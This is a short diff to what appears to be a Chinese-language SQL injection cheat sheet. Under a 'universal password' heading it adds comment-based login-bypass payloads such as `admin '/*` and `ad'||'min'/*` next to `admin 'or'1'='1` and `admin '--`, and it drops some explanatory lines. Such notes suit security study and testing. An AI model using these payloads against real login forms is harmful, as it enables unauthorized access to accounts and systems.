@@ -71,11 +71,12 @@ or
 ##### 萬用密碼
 `admin 'or'1'='1`
 
-密碼亂打，bypass
-
-如果檢查sql injection則:
-
 `admin '--`
+
+`admin '/*`
+
+`ad'||'min'/*`
+
 ##### Common Vectors(MySQL for example)
 `SELECT user();`
 
